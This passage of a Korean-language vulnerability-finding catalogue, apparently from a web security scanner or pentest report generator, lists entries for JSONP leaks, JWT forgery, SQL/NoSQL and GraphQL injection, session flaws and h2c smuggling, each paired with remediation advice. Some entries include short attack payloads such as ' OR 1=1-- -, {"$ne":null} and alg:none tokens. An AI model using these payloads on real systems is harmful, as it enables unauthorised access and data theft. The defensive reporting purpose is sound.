        "id": "WEB-JSONP-200",
        "category": "JSONP 오용 (민감정보 노출)",
        "cwe": "CWE-200",
        "kisa_category": "정보 노출 / 접근 제어",
        "business_impact": "JSONP 로 인증정보/개인정보가 GET·콜백으로 반환되면 악성 사이트가 크로스오리진으로 탈취 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "6.1",
        "exploitation_difficulty": "Medium",
        "title": "JSONP 오용 — 크로스오리진 민감정보 노출",
        "description": ("JSONP 엔드포인트가 인증/민감 데이터를 콜백으로 감싸 반환하면, 임의 사이트가 "
                        "script 태그로 요청해 크로스오리진으로 데이터를 탈취할 수 있습니다."),
        "attack_vector": "악성 페이지가 <script src=victim/api?callback=steal> 로 민감 응답 탈취.",
        "attack_scenario": ("1. JSONP 엔드포인트(callback 파라미터) 식별\n"
                            "2. 임의 콜백명으로 요청 → 응답이 콜백(...) 로 감싸짐\n"
                            "3. 악성 사이트에서 script 로 로드해 데이터 탈취"),
        "tools": ["curl", "browser"],
        "cve_references": [],
        "lab_guide": "OWASP Cross-Site Script Inclusion (XSSI)",
        "recommendation": ("민감 데이터는 JSONP 로 제공하지 마세요. CORS + 인증 토큰 검증으로 대체하고, "
                           "콜백 파라미터를 화이트리스트로 제한하세요."),
    },
    "token_in_url": {
        "id": "WEB-URLTOK-598",
        "category": "URL 쿼리스트링 내 민감 토큰 노출",
        "cwe": "CWE-598",
        "kisa_category": "정보 노출 / 세션 관리",
        "business_impact": "세션/인증 토큰이 Referer 헤더·프록시/서버 로그·브라우저 히스토리로 누출되어 세션 탈취 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Medium",
        "title": "URL 쿼리스트링에 민감 토큰 노출 (CWE-598)",
        "description": ("세션 ID·access_token 등 민감 자격증명이 URL 쿼리 파라미터로 전달됩니다. "
                        "Referer 헤더, 접근 로그, 브라우저 히스토리로 유출될 수 있습니다."),
        "attack_vector": "외부 링크 클릭 시 Referer 로 토큰 유출, 또는 로그/캐시에 남은 토큰 재사용.",
        "attack_scenario": ("1. 인증 토큰이 URL 쿼리로 전달됨\n"
                            "2. 사용자가 외부 링크 클릭 → Referer 헤더로 토큰 유출\n"
                            "3. 또는 프록시/서버 로그에 남은 토큰을 공격자가 획득 → 세션 탈취"),
        "tools": ["burpsuite", "browser"],
        "cve_references": [],
        "lab_guide": "OWASP Session Management Testing (WSTG-SESS)",
        "recommendation": ("민감 토큰은 URL 대신 쿠키(HttpOnly/Secure/SameSite) 또는 요청 본문/헤더로 "
                           "전달하세요. Referrer-Policy: no-referrer 를 적용하세요."),
    },
    "unauth_privileged_content": {
        "id": "WEB-UNAUTH-306",
        "category": "미인증 특권 콘텐츠 접근 (서버측 인증 누락)",
        "cwe": "CWE-306",
        "kisa_category": "부적절한 접근 제어 / 인증",
        "business_impact": "인증 없이 관리/특권 기능·데이터에 접근 가능 → 무단 조회·조작·정보 유출",
        "severity": "HIGH",
        "cvss_estimate": "7.5",
        "exploitation_difficulty": "Easy",
        "title": "미인증 특권 콘텐츠 접근 (CWE-306)",
        "description": ("세션 없이 관리/특권 엔드포인트에 접근했을 때 로그인 유도 없이 관리 콘텐츠·"
                        "데이터가 렌더링됩니다. 서버측에서 인증을 강제하지 않습니다."),
        "attack_vector": "직접 HTTP 클라이언트로 UI/JS 게이트를 우회해 관리 엔드포인트에 요청.",
        "attack_scenario": ("1. 관리/특권 엔드포인트 식별\n"
                            "2. 세션 없이 직접 요청\n"
                            "3. 로그인 없이 관리 콘텐츠/데이터 반환 → 무단 접근"),
        "tools": ["curl", "burpsuite"],
        "cve_references": [],
        "lab_guide": "OWASP Authorization Testing (WSTG-ATHZ)",
        "recommendation": ("모든 관리/특권 엔드포인트에 서버측 인증·인가를 강제하세요. "
                           "클라이언트 UI 숨김에 의존하지 마세요."),
    },
    "cve_exposure": {
        "id": "WEB-CVE-1104",
        "category": "알려진 CVE 노출 (취약·오래된 컴포넌트 · 확인 필요)",
        "cwe": "CWE-1104",
        "kisa_category": "취약하고 오래된 요소",
        "business_impact": ("스택 지문이 알려진 CVE 영향 범위와 일치 → 미패치 시 해당 CVE의 영향"
                            "(정보 유출·인가 우회·원격 코드 실행 등)에 노출될 수 있음."),
        "severity": "HIGH",
        "cvss_estimate": "N/A",
        "exploitation_difficulty": "-",
        "title": "알려진 CVE 노출 가능 (버전·패치 확인 필요)",
        "description": ("대상 스택의 지문이 알려진 CVE의 영향 범위와 일치합니다. 지문 상관에 따른 "
                        "'점검 필요' 항목이며 능동 실증은 수행하지 않았습니다 — 해당 컴포넌트의 버전과 "
                        "패치 적용 여부를 확인해 실제 해당 여부를 판정해야 합니다."),
        "attack_vector": "해당 CVE의 공개 익스플로잇 경로(항목별 참조 CVE 참고).",
        "attack_scenario": ("1. 스택/버전 식별\n2. 해당 CVE 영향 범위 여부 확인\n"
                            "3. 미패치 시 공개 익스플로잇으로 침해 가능"),
        "tools": [],
        "cve_references": [],
        "lab_guide": "해당 CVE 벤더 보안 권고 참조",
        "recommendation": ("식별된 컴포넌트를 최신 보안 패치 버전으로 업그레이드하고, 항목별 참조 CVE의 "
                           "벤더 권고에 따라 완화 조치를 적용하세요."),
    },
    "react2shell": {
        "id": "WEB-REACT2SHELL-502",
        "category": "React/Next.js Server Components 역직렬화 RCE (CVE-2025-55182)",
        "cwe": "CWE-502",
        "kisa_category": "안전하지 않은 역직렬화 / 원격 코드 실행",
        "business_impact": ("무인증 원격 코드 실행 → 서버 완전 장악, 데이터 유출·파괴, 내부망 침투. "
                            "실제 공격이 관측된 치명적 취약점(CVSS 10.0)."),
        "severity": "CRITICAL",
        "cvss_estimate": "10.0",
        "exploitation_difficulty": "Easy",
        "title": "React2Shell — RSC/Server Actions 역직렬화 RCE (CVE-2025-55182)",
        "description": ("React Server Components의 Flight 페이로드 디코딩에서 공격자 입력이 안전하지 않게 "
                        "역직렬화되어, 무인증 공격자가 임의 Server Function 엔드포인트에 악성 요청을 보내 "
                        "원격 코드 실행을 유발할 수 있습니다. 본 점검은 비파괴로 취약 스택과 Server Actions "
                        "노출만 확인했으며 실제 RCE는 수행하지 않았습니다 — 패치 여부 즉시 검증이 필요합니다."),
        "attack_vector": "무인증 HTTP 요청으로 Server Function 엔드포인트에 악성 Flight 페이로드 전송.",
        "attack_scenario": ("1. React Server Components/Next.js Server Actions 엔드포인트 식별\n"
                            "2. 내부 가젯을 연쇄한 악성 Flight 페이로드 작성('.then' Promise 유사 객체)\n"
                            "3. 무인증 전송 → 역직렬화 중 자동 resolve → 서버 원격 코드 실행"),
        "tools": [],
        "cve_references": ["CVE-2025-55182"],
        "lab_guide": "React Security Advisory (2025-12-03) · WSTG-INPV / 역직렬화",
        "recommendation": ("react-server-dom-*(webpack/turbopack/parcel) 및 Next.js를 보안 권고에서 명시한 "
                           "고정 버전으로 즉시 업그레이드하고, 미검증 Server Action/RSC 요청을 WAF/프록시에서 "
                           "차단하십시오. Server Functions 노출을 최소화하세요."),
    },
    "unauth_write_bac": {
        "id": "WEB-UNAUTHWRITE-862",
        "category": "미인증 쓰기 접근통제 취약 (상태 변경 인가 누락)",
        "cwe": "CWE-862",
        "kisa_category": "부적절한 접근 제어 / 인가",
        "business_impact": ("인증 없이 게시글 작성·공지 변조·데이터 삭제 등 상태 변경 가능 → "
                            "콘텐츠 위·변조, 무단 삭제, 서비스 무결성 훼손"),
        "severity": "HIGH",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "Easy",
        "title": "미인증 쓰기 접근통제 취약 (CWE-862)",
        "description": ("로그인(세션) 없이 상태 변경(작성/수정/삭제) 엔드포인트에 요청했을 때 "
                        "서버가 인증·인가를 강제하지 않고 핸들러를 처리합니다. 비파괴 검증(존재하지 "
                        "않는 ID/무해 마커)으로 인증 게이트 부재만 확인했으며 실제 데이터는 변경하지 않았습니다."),
        "attack_vector": "직접 HTTP 클라이언트로 UI/클라이언트 게이트를 우회해 무인증 쓰기 요청.",
        "attack_scenario": ("1. 상태 변경 엔드포인트(작성/수정/삭제) 식별\n"
                            "2. 세션 없이 직접 요청(비파괴: 존재하지 않는 ID·무해 마커)\n"
                            "3. 401/403·로그인 유도 없이 서버 핸들러 처리 → 무인증 상태 변경 가능 확인"),
        "tools": [],
        "cve_references": [],
        "lab_guide": "OWASP Authorization Testing (WSTG-ATHZ-02)",
        "recommendation": ("모든 상태 변경(작성/수정/삭제) 엔드포인트에 서버측 인증·인가를 강제하고, "
                           "리소스 소유권을 검증하세요. 클라이언트 UI 숨김에 의존하지 마세요."),
    },
    "api_json_injection": {
        "id": "WEB-APIJSON-89",
        "category": "API JSON 바디 주입 (SQL/NoSQL)",
        "cwe": "CWE-89",
        "kisa_category": "인젝션",
        "business_impact": "JSON API 파라미터를 통한 SQL/NoSQL 인젝션으로 인증 우회·데이터 유출·조작 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.1",
        "exploitation_difficulty": "Medium",
        "title": "API JSON 바디 주입 (SQL/NoSQL Injection)",
        "description": ("application/json 바디를 받는 API 엔드포인트에서, JSON 필드 값이 SQL/NoSQL "
                        "쿼리에 안전하지 않게 삽입됩니다. 폼/쿼리가 아닌 JSON 경로의 주입입니다."),
        "attack_vector": ("JSON 필드에 SQL 홑따옴표/구문 또는 NoSQL 연산자({$ne:null} 등)를 넣어 "
                          "쿼리 조작. 예: {\"email\":\"' OR 1=1-- -\"} 또는 {\"user\":{\"$ne\":null}}."),
        "attack_scenario": ("1. JSON API 엔드포인트 식별\n"
                            "2. JSON 필드에 SQL/NoSQL 주입 페이로드 전송\n"
                            "3. DB 에러/차등 응답/연산자 해석 확인 → 인증우회·데이터접근"),
        "tools": ["burpsuite", "sqlmap", "curl"],
        "cve_references": [],
        "lab_guide": "OWASP API Security / Injection Testing",
        "recommendation": ("JSON 입력도 파라미터화 쿼리·타입 검증·스키마 검증을 적용하세요. "
                           "NoSQL 은 사용자 입력이 연산자로 해석되지 않도록 캐스팅/화이트리스트하세요."),
    },
    "graphql_injection": {
        "id": "WEB-GQLINJ-89",
        "category": "GraphQL 쿼리 인젝션 (SQLi)",
        "cwe": "CWE-89",
        "kisa_category": "인젝션",
        "business_impact": "GraphQL 리졸버가 인자값을 안전하지 않게 SQL 에 삽입 — 인증우회·데이터 유출·조작 가능",
        "severity": "HIGH",
        "cvss_estimate": "8.9",
        "exploitation_difficulty": "Medium",
        "title": "GraphQL 쿼리 인젝션 (SQL Injection)",
        "description": ("GraphQL Query 필드의 문자열 인자값이 리졸버에서 SQL 쿼리에 안전하지 않게 "
                        "삽입됩니다. introspection 으로 표적 필드를 식별해 실증했습니다."),
        "attack_vector": ("GraphQL 쿼리 인자에 SQL 구문(홑따옴표 등)을 주입. 예: "
                          "query { user(id: \"' OR 1=1-- -\") { id } }. 서버는 대개 HTTP 200 + "
                          "errors[] 에 DB 에러를 실어보낸다."),
        "attack_scenario": ("1. GraphQL 엔드포인트(/graphql 등) 식별\n"
                            "2. introspection 으로 문자열 인자 Query 필드 열거\n"
                            "3. 인자값에 SQL 페이로드 주입 → DB 에러/차등 응답 확인 → 데이터 접근"),
        "tools": ["burpsuite", "graphql-cop", "sqlmap", "InQL"],
        "cve_references": [],
        "lab_guide": "OWASP GraphQL Cheat Sheet / API Injection Testing",
        "recommendation": ("GraphQL 리졸버에서도 파라미터화 쿼리·ORM 바인딩을 사용하고, 인자값을 "
                           "쿼리 문자열에 직접 연결하지 마세요. introspection 은 운영에서 비활성화 권장."),
    },
    "graphql_dos": {
        "id": "WEB-GQLDOS-770",
        "category": "GraphQL 리소스 제한 부재 (배칭/복잡도)",
        "cwe": "CWE-770",
        "kisa_category": "설정 오류",
        "business_impact": "쿼리 배칭·별칭 증폭으로 레이트리밋 우회 및 서비스 거부(자원 고갈) 유발 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Low",
        "title": "GraphQL 배칭/복잡도 제한 부재 (DoS)",
        "description": ("GraphQL 엔드포인트가 요청당 다중 쿼리(배칭)나 단일 쿼리 내 다중 별칭을 "
                        "제한 없이 허용합니다. 실제 DoS 를 유발하지 않고 무비용 벤치마크 쿼리로 "
                        "'보호 제한의 부재'만 실증했습니다."),
        "attack_vector": ("(a) 배열 본문 [{query},{query},…] 로 요청당 다중 쿼리 실행 → 레이트리밋 우회 "
                          "(예: 로그인 다중 시도). (b) 단일 쿼리에 동일 필드 별칭 다수 → 복잡도 증폭."),
        "attack_scenario": ("1. GraphQL 엔드포인트 식별\n"
                            "2. 소량 배치/별칭 쿼리로 제한 부재 확인\n"
                            "3. 공격 시 대량 배칭·깊은 중첩·별칭 증폭으로 자원 고갈/레이트리밋 우회"),
        "tools": ["graphql-cop", "burpsuite", "graphql-cost-analysis"],
        "cve_references": [],
        "lab_guide": "OWASP GraphQL Cheat Sheet — Query Cost / Rate Limiting",
        "recommendation": ("쿼리 깊이·복잡도(cost) 제한, 배치 쿼리 수 제한, 별칭/중복 필드 제한, "
                           "요청 레이트리밋을 적용하세요. 페이지네이션 최대치도 강제하세요."),
    },
    "graphql_field_suggestion": {
        "id": "WEB-GQLSUGGEST-200",
        "category": "GraphQL 필드 제안 누출 (스키마 노출)",
        "cwe": "CWE-200",
        "kisa_category": "정보 노출",
        "business_impact": "introspection 이 꺼져 있어도 오류 제안(Did you mean)으로 스키마 필드명 유출",
        "severity": "LOW",
        "cvss_estimate": "3.7",
        "exploitation_difficulty": "Low",
        "title": "GraphQL 필드 제안 누출 (Did you mean)",
        "description": ("GraphQL 서버가 오타/미존재 필드 쿼리에 'Did you mean \"…\"' 제안을 반환합니다. "
                        "introspection 을 비활성화해도 이 제안으로 유효 필드명을 유추해 스키마를 "
                        "부분 재구성할 수 있습니다."),
        "attack_vector": ("오타 필드(예: __typenam)를 쿼리해 서버 오류의 'Did you mean' 제안을 수집. "
                          "반복 유추로 스키마 필드명을 열거."),
        "attack_scenario": ("1. GraphQL 엔드포인트 식별(introspection 은 꺼져 있을 수 있음)\n"
                            "2. 오타 필드 쿼리 → 'Did you mean' 제안 확인\n"
                            "3. 제안을 반복 수집해 스키마 필드명 재구성 → 추가 공격 표면 확보"),
        "tools": ["graphql-cop", "clairvoyance", "burpsuite"],
        "cve_references": [],
        "lab_guide": "OWASP GraphQL Cheat Sheet — Disable Field Suggestions",
        "recommendation": ("운영 환경에서 필드 제안(field suggestions)을 비활성화하세요"
                           "(graphql-js: 커스텀 validation rule 로 제안 제거). introspection 도 비활성 권장."),
    },
    "graphql_directive_overload": {
        "id": "WEB-GQLDIR-770",
        "category": "GraphQL 지시자 오버로딩 (파서/검증 증폭)",
        "cwe": "CWE-770",
        "kisa_category": "설정 오류",
        "business_impact": "지시자 개수 제한 부재로 대량 지시자 쿼리를 통한 자원 소모(DoS) 증폭 가능",
        "severity": "LOW",
        "cvss_estimate": "5.3",
        "exploitation_difficulty": "Low",
        "title": "GraphQL 지시자 오버로딩 (Directive Overloading)",
        "description": ("GraphQL 서버가 단일 쿼리 내 동일 지시자(@x)의 대량 반복을 개수 제한 없이 "
                        "파싱·검증합니다. 대량 지시자로 파서/검증 단계의 자원 소모를 증폭할 수 있습니다."),
        "attack_vector": ("query { field @x @x @x … (수천 회) } 형태로 지시자를 대량 반복해 "
                          "파서·검증기가 모두 처리하도록 강제 → CPU/메모리 소모 증폭."),
        "attack_scenario": ("1. GraphQL 엔드포인트 식별\n"
                            "2. 동일 지시자 다수 반복 쿼리로 제한 부재 확인\n"
                            "3. 공격 시 초대량 지시자로 파싱/검증 자원 고갈 유도"),
        "tools": ["graphql-cop", "burpsuite"],
        "cve_references": [],
        "lab_guide": "OWASP GraphQL Cheat Sheet — Query/Directive Limits",
        "recommendation": ("쿼리당 지시자 개수·쿼리 크기·복잡도(cost) 제한을 적용하고, 검증 전에 "
                           "요청 크기를 제한하세요. 커스텀 validation rule 로 지시자 수를 상한하세요."),
    },
    "jwt_alg_none": {
        "id": "WEB-JWT-NONE-347",
        "category": "JWT 서명 검증 우회 (alg:none 위조)",
        "cwe": "CWE-347",
        "kisa_category": "인증",
        "business_impact": "서명 없는 위조 토큰 수락 — 임의 계정/권한으로 토큰 위조해 인증 완전 우회 가능",
        "severity": "CRITICAL",
        "cvss_estimate": "9.8",
        "exploitation_difficulty": "Easy",
        "title": "JWT alg:none 위조 수락 (서명 검증 우회)",
        "description": ("서버가 alg 를 'none' 으로 설정한 서명 없는 JWT 를 유효 토큰처럼 수락합니다. "
                        "payload(sub/role 등)를 임의로 바꿔 서명 없이 인증을 완전히 우회할 수 있습니다. "
                        "위조 토큰 재전송이 유효 토큰과 동일한 인증 응답을 반환함을 실증했습니다."),
        "attack_vector": ("JWT 헤더를 {\"alg\":\"none\"} 로 바꾸고 서명 세그먼트를 비워 재전송. "
                          "payload 의 sub/role/admin 등을 조작해 임의 사용자·권한으로 위조."),
        "attack_scenario": ("1. 본인 토큰의 payload 획득\n"
                            "2. alg 를 none 으로, 서명을 빈 값으로 위조\n"
                            "3. 재전송 시 수락 확인 → role:admin 등으로 위조해 권한 상승/계정 탈취"),
        "tools": ["jwt_tool", "burpsuite", "jwt.io"],
        "cve_references": ["CVE-2015-9235", "CVE-2016-5431"],
        "lab_guide": "PortSwigger JWT Labs — JWT authentication bypass via unverified signature",
        "recommendation": ("서버에서 허용 알고리즘을 명시적 화이트리스트(예: RS256)로 강제하고 "
                           "alg:none 을 거부하세요. 라이브러리의 알고리즘 자동 선택을 끄고 서명 검증을 "
                           "필수화하세요. 대칭/비대칭 혼동(alg confusion)도 함께 차단하세요."),
    },
    "jwt_alg_confusion": {
        "id": "WEB-JWT-CONFUSION-347",
        "category": "JWT 알고리즘 혼동 (RS256→HS256)",
        "cwe": "CWE-347",
        "kisa_category": "인증",
        "business_impact": "공개키를 HMAC 시크릿으로 오용 — 임의 payload 토큰 위조로 인증/권한 완전 우회",
        "severity": "CRITICAL",
        "cvss_estimate": "9.8",
        "exploitation_difficulty": "Medium",
        "title": "JWT 알고리즘 혼동 (RS256→HS256 서명 위조)",
        "description": ("서버가 RS256(비대칭) 검증을 기대하지만 토큰 헤더의 alg 를 신뢰해, 공격자가 "
                        "공개키(JWKS 노출)를 HMAC 시크릿으로 서명한 HS256 토큰을 수락합니다. "
                        "공개키만으로 임의 토큰을 위조할 수 있어 인증이 완전히 무너집니다. "
                        "JWKS 공개키로 위조한 HS256 토큰이 유효 토큰과 동일하게 수락됨을 실증했습니다."),
        "attack_vector": ("JWKS(/.well-known/jwks.json)에서 RSA 공개키 획득 → 그 PEM 공개키를 HMAC "
                          "키로 삼아 HS256 서명 → 헤더 alg 를 HS256 로 위조해 재전송."),
        "attack_scenario": ("1. 토큰 alg 가 RS256 임을 확인, JWKS 에서 공개키 수집\n"
                            "2. 공개키를 HMAC 시크릿으로 HS256 위조(payload 조작 가능)\n"
                            "3. 재전송 수락 확인 → role:admin 등으로 위조해 권한 상승/계정 탈취"),
        "tools": ["jwt_tool", "burpsuite", "jwks-to-pem"],
        "cve_references": ["CVE-2016-5431", "CVE-2022-23540"],
        "lab_guide": "PortSwigger JWT Labs — JWT authentication bypass via algorithm confusion",
        "recommendation": ("서명 검증 시 허용 알고리즘을 서버 설정으로 명시(예: algorithms=['RS256'])하고 "
                           "토큰 헤더의 alg 를 신뢰하지 마세요. 대칭·비대칭 키 타입을 분리하고, HS 계열이 "
                           "공개키를 시크릿으로 쓰지 못하도록 검증 인터페이스를 강타입화하세요."),
    },
    "weak_session_id": {
        "id": "WEB-WEAKSESS-330",
        "category": "약한 세션 식별자 (예측 가능한 세션 ID)",
        "cwe": "CWE-330",
        "kisa_category": "인증",
        "business_impact": "세션 식별자가 순차·저엔트로피로 예측 가능 — 타인 세션을 추측해 계정 도용(세션 하이재킹)",
        "severity": "HIGH",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "Low",
        "title": "약한 세션 식별자 (예측 가능한 세션 ID)",
        "description": ("세션 식별자가 순차 증가하거나 엔트로피가 낮아 예측/추측이 가능합니다. 공격자가 "
                        "다음 값 또는 타인의 세션 값을 추측해 인증된 세션을 가로챌 수 있습니다. 연속 발급된 "
                        "토큰 값이 규칙적(예: 1,2,3)임을 실측했습니다."),
        "attack_vector": ("세션 토큰을 여러 번 발급받아 규칙성 확인 → 유효한 타인 세션 값을 추측·설정하여 "
                          "인증 상태로 접근."),
        "attack_scenario": ("1. 세션 토큰을 반복 발급받아 값의 규칙(순차/저엔트로피) 파악\n"
                            "2. 유효한 다른 사용자 세션 값 추측\n"
                            "3. 그 값을 쿠키로 설정해 해당 사용자로 인증된 접근"),
        "tools": ["burpsuite", "owasp-zap"],
        "cve_references": [],
        "lab_guide": "OWASP Testing for Weak Session token / PortSwigger session prediction",
        "recommendation": ("세션 식별자는 암호학적으로 안전한 난수(CSPRNG)로 충분한 길이(≥128bit)로 생성하세요. "
                           "순차·타임스탬프 기반 등 예측 가능한 방식을 금지하고, 쿠키에 HttpOnly·Secure·SameSite 를 설정하세요."),
    },
    "session_fixation": {
        "id": "WEB-SESSFIX-384",
        "category": "세션 고정 (Session Fixation)",
        "cwe": "CWE-384",
        "kisa_category": "인증",
        "business_impact": "로그인 후 세션 ID 미회전 — 공격자가 고정시킨 세션이 인증되어 계정 탈취 가능",
        "severity": "HIGH",
        "cvss_estimate": "8.1",
        "exploitation_difficulty": "Medium",
        "title": "세션 고정 (로그인 후 세션 ID 미회전)",
        "description": ("서버가 로그인 성공 후에도 세션 식별자를 재발급(회전)하지 않습니다. 공격자가 "
                        "피해자에게 자신이 아는 세션 ID 를 고정시켜 두면, 피해자가 로그인한 뒤 그 세션이 "
                        "인증 상태가 되어 공격자가 계정을 탈취할 수 있습니다. 로그인 전후 세션 쿠키 값이 "
                        "동일함(미회전)을 실증했습니다."),
        "attack_vector": ("피해자 브라우저에 알려진 세션 ID 를 심음(링크/XSS/서브도메인 쿠키) → 피해자 로그인 "
                          "→ 세션 ID 가 그대로 유지되므로 공격자가 동일 세션으로 인증 상태 접근."),
        "attack_scenario": ("1. 공격자가 세션 ID 획득/고정\n"
                            "2. 피해자에게 그 세션 ID 를 심어 로그인 유도\n"
                            "3. 로그인 후에도 세션 ID 불변 → 공격자가 동일 세션으로 계정 접근"),
        "tools": ["burpsuite", "owasp-zap"],
        "cve_references": [],
        "lab_guide": "OWASP Session Fixation / PortSwigger Session management labs",
        "recommendation": ("로그인·권한 변경 시 세션 식별자를 반드시 재발급(session regeneration)하세요. "
                           "세션 쿠키에 HttpOnly·Secure·SameSite 를 설정하고, URL 기반 세션 전달을 금지하세요."),
    },
    "logout_invalidation": {
        "id": "WEB-LOGOUT-613",
        "category": "로그아웃 무효화 실패 (세션 만료 부족)",
        "cwe": "CWE-613",
        "kisa_category": "인증",
        "business_impact": "로그아웃 후에도 옛 세션 토큰이 유효 — 탈취된 토큰으로 지속 접근 가능",
        "severity": "MEDIUM",
        "cvss_estimate": "6.5",
        "exploitation_difficulty": "Medium",
        "title": "로그아웃 후 세션 미무효화 (Insufficient Session Expiration)",
        "description": ("서버가 로그아웃 시 세션을 서버측에서 무효화하지 않고 클라이언트 쿠키만 삭제합니다. "
                        "기록/탈취된 옛 세션 토큰을 재전송하면 로그아웃 후에도 여전히 인증 상태로 접근됩니다. "
                        "로그아웃 실행 후 옛 토큰이 계속 인증 응답을 반환함을 실증했습니다."),
        "attack_vector": ("로그아웃 전 세션 토큰을 확보(공유 PC·XSS·네트워크 캡처) → 피해자 로그아웃 후에도 "
                          "동일 토큰으로 인증 리소스 접근."),
        "attack_scenario": ("1. 세션 토큰 확보\n"
                            "2. 사용자가 로그아웃\n"
                            "3. 옛 토큰 재전송 → 서버 미무효화로 계속 인증됨 → 데이터 접근/계정 악용"),
        "tools": ["burpsuite", "owasp-zap"],
        "cve_references": [],
        "lab_guide": "OWASP Session Management — Session Expiration / PortSwigger labs",
        "recommendation": ("로그아웃 시 서버측 세션 저장소에서 세션을 즉시 파기하세요. JWT 등 무상태 토큰은 "
                           "짧은 만료시간 + 서버측 폐기목록(revocation)·리프레시 토큰 회전을 적용하세요. "
                           "유휴/절대 세션 타임아웃도 함께 강제하세요."),
    },
    "session_timeout": {
        "id": "WEB-SESSTIMEOUT-613",
        "category": "세션 타임아웃 미흡 (과도한 절대 수명)",
        "cwe": "CWE-613",
        "kisa_category": "인증",
        "business_impact": "세션 토큰의 절대 수명이 과도하거나 만료가 없어 탈취 토큰의 재사용 창이 큼",
        "severity": "MEDIUM",
        "cvss_estimate": "5.9",
        "exploitation_difficulty": "Medium",
        "title": "세션 절대 타임아웃 미흡 (과도한 세션 수명/만료 부재)",
        "description": ("인증 세션 토큰의 절대 수명이 과도하거나(권장 임계 초과) 만료(exp)가 아예 없습니다. "
                        "토큰을 탈취당하면 오랜 기간(또는 무기한) 재사용이 가능해 계정 노출 창이 커집니다. "
                        "발급된 토큰 자체의 수명값(JWT exp / 쿠키 Max-Age·Expires)으로 측정했습니다."),
        "attack_vector": ("탈취/유출된 세션 토큰을 만료 시점까지(또는 무기한) 재사용해 인증 리소스 접근."),
        "attack_scenario": ("1. 세션 토큰 유출(로그·캐시·네트워크·XSS)\n"
                            "2. 토큰 절대 수명이 길거나 만료 없음\n"
                            "3. 장기간/무기한 재사용으로 계정 지속 접근"),
        "tools": ["jwt.io", "burpsuite"],
        "cve_references": [],
        "lab_guide": "OWASP Session Management — Session Timeout / Absolute Expiration",
        "recommendation": ("세션·토큰에 짧은 절대 만료(예: JWT 수시간 이내)와 유휴 타임아웃을 강제하고, "
                           "리프레시 토큰 회전을 적용하세요. 영속 세션 쿠키의 Max-Age 를 최소화하고, "
                           "무상태 토큰은 서버측 폐기목록으로 조기 무효화가 가능하도록 하세요."),
    },
    "session_idle_timeout": {
        "id": "WEB-SESSIDLE-613",
        "category": "유휴 세션 타임아웃 미흡",
        "cwe": "CWE-613",
        "kisa_category": "인증",
        "business_impact": "일정 시간 무활동 후에도 세션이 유효 — 방치·탈취 세션의 재사용 창이 큼",
        "severity": "LOW",
        "cvss_estimate": "4.8",
        "exploitation_difficulty": "Medium",
        "title": "유휴 세션 타임아웃 미흡 (Idle Session Timeout)",
        "description": ("로그인 후 일정 시간 아무 요청 없이 방치해도 세션이 만료되지 않습니다. 공유 PC "
                        "방치·토큰 탈취 시 재사용 가능 시간이 길어집니다. 대기 후 재전송으로 실증했습니다."),
        "attack_vector": ("피해자 로그인 후 자리를 비운 사이(무활동) 남은 세션을 재사용하거나, 탈취한 "
                          "세션 토큰을 유휴 만료 없이 오래 재사용."),
        "attack_scenario": ("1. 로그인 후 무활동 상태 방치/토큰 확보\n"
                            "2. 유휴 만료가 길거나 없음\n"
                            "3. 남은/탈취 세션을 재사용해 인증 접근"),
        "tools": ["burpsuite", "owasp-zap"],
        "cve_references": [],
        "lab_guide": "OWASP Session Management — Idle Timeout",
        "recommendation": ("서버측 유휴(비활동) 타임아웃을 설정해 일정 시간 무활동 세션을 만료시키세요"
                           "(민감 서비스는 15분 이하 권장). 절대 만료·재인증도 함께 적용하세요."),
    },
    "grpc_web_service": {
        "id": "WEB-GRPCWEB-200",
        "category": "gRPC-web 공격표면 노출",
        "cwe": "CWE-200",
        "kisa_category": "정보 노출",
        "business_impact": ("브라우저 탐색으로는 드러나지 않는 gRPC-web 서비스가 존재 — 인증/권한/입력검증이 "
                            "REST 만큼 점검되지 않으면 우회·주입·데이터 노출의 사각지대가 됨"),
        "severity": "INFO",
        "cvss_estimate": "3.1",
        "exploitation_difficulty": "Medium",
        "title": "gRPC-web 서비스 발견 (추가 공격표면)",
        "description": ("프런트엔드 JS 의 gRPC-web 클라이언트 신호와 /package.Service/Method 경로를 gRPC-web "
                        "요청으로 찔러, 서버가 grpc-status/application/grpc-web 로 응답하는 gRPC-web 서비스를 "
                        "확증했습니다. 일반 크롤/브라우징으로는 발견되지 않는 별도 API 표면입니다."),
        "attack_vector": ("발견된 /package.Service/Method 엔드포인트에 gRPC-web 프레임을 직접 전송해 인증/권한 "
                          "검사, 입력 검증, 대량 조회 제한을 우회 시도."),
        "attack_scenario": ("1. JS 번들에서 gRPC-web 클라이언트/서비스 경로 확보\n"
                            "2. grpc-web 요청으로 서비스 존재 확증(grpc-status 응답)\n"
                            "3. 메서드별 인증/권한/입력검증을 REST 와 동일 기준으로 재점검"),
        "tools": ["grpcurl", "burpsuite", "grpc-web-devtools"],
        "cve_references": [],
        "lab_guide": "gRPC-web 서비스별 인증·권한·입력검증 수동 점검",
        "recommendation": ("gRPC-web 엔드포인트에도 REST 와 동일한 인증/인가/입력검증/속도제한을 적용하고, "
                           "리플렉션(server reflection) 비활성화 및 메서드별 권한 검사를 확인하세요."),
    },
    "h2c_smuggling": {
        "id": "WEB-H2C-444",
        "category": "평문 HTTP/2(h2c) 업그레이드 수락",
        "cwe": "CWE-444",
        "kisa_category": "요청 처리",
        "business_impact": ("앞단 프록시/WAF 가 h2c 를 미검사하면 h2c 스머글링으로 접근제어·검사 우회 및 내부 "
                            "엔드포인트 도달이 가능 — 인증 우회/SSRF 성 접근의 발판"),
        "severity": "MEDIUM",
        "cvss_estimate": "5.9",
        "exploitation_difficulty": "High",
        "title": "평문 HTTP/2(h2c) 업그레이드 수락 (h2c smuggling 위험)",
        "description": ("서버가 Upgrade: h2c 요청에 101 Switching Protocols 로 응답해 평문 HTTP/2 업그레이드를 "
                        "수락합니다. 앞단 프록시가 h2c 를 검사하지 않는 구성이라면, 업그레이드된 h2c 커넥션을 통해 "
                        "프록시의 경로/인증 검사를 우회하는 요청 스머글링이 가능합니다."),
        "attack_vector": ("프록시를 통과하는 h2c 업그레이드 후, 프록시가 보지 못하는 h2 스트림으로 내부 전용/"
                          "관리 경로에 직접 요청을 실어 접근제어를 우회."),
